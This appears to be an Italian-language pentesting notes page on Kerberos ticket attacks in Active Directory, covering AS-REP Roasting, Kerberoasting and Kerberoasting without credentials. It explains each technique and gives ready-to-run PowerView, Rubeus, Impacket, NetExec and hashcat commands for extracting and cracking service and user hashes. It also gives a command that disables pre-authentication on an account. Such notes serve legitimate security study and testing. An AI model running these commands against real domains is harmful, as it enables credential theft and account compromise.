---
description: Kerberos Ticket Request Attacks
authors: pozivonpm
category: ad
---
# Ticket Request Attacks

Ci sono due modi per richiedere un ticket: 

- TGT o `AS-REQ`, a cui il KDC risponde con un `AS-REP`
- Richiesta TGS, o `TGS-REQ`, a cui il KDC risponde con un `TGS-REP`

### AS-REP Roasting

Quando abbiamo richiesto un TGT (AS-REQ), abbiamo visto che `per impostazione predefinita`, un utente deve autenticarsi tramite un `autenticatore` crittografato con il proprio segreto. Tuttavia, se un utente ha **disabilitato la  preautenticazione**, potremmo richiedere i dati di autenticazione per  quell'utente e il KDC restituirà un messaggio AS-REP. Poiché parte di  tale messaggio (la chiave di sessione temporanea condivisa) viene  crittografata utilizzando la password dell'utente, è possibile eseguire  **un attacco di forza bruta offline per tentare di recuperare la password** dell'utente.

Ci sono **altri modi** in cui possiamo sfruttare questo attacco, se si hanno delle autorizzazioni `GenericWrite` o `GenericAll` per un account. In tal caso, possono abilitare questo attributo e  ottenere il ticket AS_REP per il cracking offline per recuperare la  password dell'account prima di disabilitarlo nuovamente; il successo dipende dal fatto che l'utente abbia una password relativamente debole. 

**ENUMERAZIONE**
::: tabs
=== PowerView

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) può essere usato per enumerare gli utenti con il flag della proprietà [UserAccountControl](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) (`UAC`) impostato su `DONT_REQ_PREAUTH`.

```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
=== Rubeus
Possiamo anche utilizzare `Rubeus.exe asreproast /format:hashcat` per enumerare tutti gli account con il flag `DONT_REQ_PREAUTH`.

```powershell
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```
=== Impacket

```bash
impacket-GetNPUsers '$domain'/'$user':'$passwd' -dc-ip '$ip' -no-pass | grep '\$krb5asrep\$' > as-rep.txt

impacket-GetNPUsers -request '$domain'/'$user':'$passwd' -dc-ip '$ip' -outputfile as-rep.txt

impacket-GetNPUsers '$domain'/ -dc-ip '$ip' -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

=== NetExec

```bash
nxc ldap $ip -u '$user' -p '$passwd' --asreproast as-rep.txt
```
:::
Se la pre-autenticazione è disabilitata per un utente, l'invio di un nome utente valido fa sì che il KDC risponda con un messaggio AS-REP valido.
**Se la pre-autenticazione è abilitata, le risposte del KDC variano in base all'esistenza del nome utente o meno:**

`KRB5KDC_ERR_PREAUTH_REQUIRED` - Se è richiesta la pre-autenticazione e l'utente esiste.
`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` - Se l'utente non esiste.


**CRACKING HASH**

```bash
hashcat.exe -m 18200 hashes.txt /Tools/rockyou.txt -O
john --wordlist=/Tools/rockyou.txt hashes.txt
```

**Impostare DONT_REQ_PREAUTH con PowerView**

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=userName)(name=userName)(displayname=userName))))
VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'userName'
```

### Kerberoasting

Allo stesso modo, quando un utente dispone di un TGT, può richiedere un  ticket di servizio per qualsiasi servizio esistente. La risposta KDC (TGS-REP) contiene informazioni crittografate con il segreto `dell'account del servizio`. Se l'account del servizio ha una password debole, è possibile eseguire lo stesso attacco offline per recuperare la password per quell'account.

`Kerberoasting` è un attacco contro gli account del servizio che consente a un utente  malintenzionato di eseguire un attacco di cracking delle password  offline contro l'account Active Directory associato al servizio. È  simile ad ASREPRoasting, ma richiede l'autenticazione preventiva al  dominio. In altre parole, per eseguire l'attacco abbiamo bisogno di un  account utente di dominio e di una password validi (anche quelli con  privilegi più bassi) o di una shell SYSTEM (o di un account di dominio  con privilegi bassi) su una macchina aggiunta a un dominio.

Quando un servizio viene registrato, un [nome dell'entità servizio (SPN)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) viene aggiunto ad Active Directory ed è un alias di un account AD  effettivo. Le informazioni archiviate in Active Directory includono il  nome del computer, la porta e l'hash della password dell'account AD. In  una configurazione corretta, gli "account di servizio" vengono  utilizzati con questi SPN per garantire una password complessa. Questi  account sono come gli account macchina e possono anche avere password a  rotazione automatica.

Un account che espone un servizio ha un nome dell'entità servizio (o SPN). Si tratta di un attributo LDAP impostato sull'account che indica  l'elenco dei servizi esistenti forniti da questo account. Se questo  attributo non è vuoto, questo account offre almeno un servizio. 

**ENUMERAZIONE:**

::: tabs
=== PowerView

[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) può essere utilizzato per enumerare gli utenti con un SPN impostato e richiedere automaticamente il `ticket di servizio (ST)` per produrre un hash crackabile.

```powershell
Get-DomainUser -SPN
```

Possiamo anche utilizzare l'uso di PowerView per eseguire direttamente l'attacco Kerberoasting.

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
```

Invece del metodo manuale illustrato sopra, possiamo utilizzare la funzione `Invoke-Kerberoast` per eseguire questa operazione rapidamente.

```powershell
Invoke-Kerberoast
```

=== Rubeus
Possiamo usare Rubeus per Kerberoast tutti gli utenti disponibili e restituire i loro hash per il cracking offline. 

```powershell
C:\Tools>Rubeus.exe kerberoast /nowrap
```

=== Impacket
**IMPACKET**

```bash
impacket-GetUserSPNs '$domain'/'$user' -request
```
:::

**CRACKING HASH**

```bash
hashcat.exe -m 13100 hashes.txt /Tools/rockyou.txt -O
hashcat -m 13100 hashes.txt rockyou.txt
```

### Kerberoasting senza password dell'account

 C'è un caso in cui possiamo eseguire un attacco Kerberoasting senza un account di dominio e una password validi, quando siamo a conoscenza di un account senza la preautenticazione Kerberos abilitata.

Possiamo utilizzare questo account per utilizzare una richiesta `AS-REQ` (solitamente utilizzata per richiedere un TGT) per richiedere un ticket TGS per un utente Kerberoastable. Questo viene fatto modificando la parte req-body della richiesta.

Per eseguire questo attacco, abbiamo bisogno di quanto segue: 

1. Nome utente di un account con la preautenticazione disabilitata (`DONT_REQ_PREAUTH`).
2. Un nome SPN di destinazione o un elenco di nomi SPN. 

```powershell
Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```

